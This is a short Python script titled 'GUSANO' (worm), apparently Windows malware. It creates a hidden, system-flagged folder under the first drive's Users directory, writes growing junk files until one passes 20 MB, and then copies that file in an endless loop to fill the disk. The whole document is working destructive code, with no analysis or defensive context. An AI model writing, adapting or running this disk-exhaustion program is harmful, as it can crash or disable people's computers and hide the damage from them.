################## GUSANO ####################
import subprocess, os, string, shutil
from humanize import naturalsize
letras = string.ascii_uppercase
x='1111111111111111111111111111111111111111111'
nn='gusano' ; n=1
for i in letras:
 letras=f'{i}:\\'
 if os.path.exists(letras):
  ruta=f'{letras}Users\\'
  break
rfolder=f"{ruta}/x0x"
if not os.path.exists(rfolder):
 os.makedirs(rfolder)
 command=f'attrib +h +s {rfolder}'
 subprocess.run(command, shell=True)
cpx=[]
while True:
 datos=x*n*10*n*10
 nombre=f'{rfolder}/{nn}{n}'
 with open(nombre, 'a') as f:
  f.write(datos)
  f.close()
 size=os.stat(nombre).st_size
 size0=naturalsize(size)
 unidad=size0.split()[1]
 pesox=size0.split()[0]
 if unidad == 'MB':
  if float(pesox) > 20.0:
   cpx.append(nombre)
   cpx.append(str(n))
   break
 n=n+1
ruta=cpx[0].replace('/', '\\')
n=int(cpx[1]) +1
ruta2='\\'.join(ruta.split('\\')[:-1]) + '\\'
while True:
 destino=f"{ruta2}{nn}{n}"
 shutil.copy(ruta, destino)
 n=n+1
#########################################